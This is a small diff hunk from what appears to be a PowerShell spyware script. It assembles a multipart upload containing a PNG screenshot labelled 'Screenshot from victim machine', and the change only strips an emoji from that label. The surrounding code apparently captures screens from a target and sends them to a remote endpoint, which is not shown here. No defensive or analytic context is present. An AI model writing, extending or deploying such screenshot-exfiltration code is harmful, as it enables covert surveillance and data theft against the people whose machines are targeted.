@@ -24,7 +24,7 @@ $bodyLines = @(
     "--$boundary",
     'Content-Disposition: form-data; name="content"',
     '',
-    "📸 Screenshot from victim machine",
+    "Screenshot from victim machine",
     "--$boundary",
     'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
     'Content-Type: image/png',
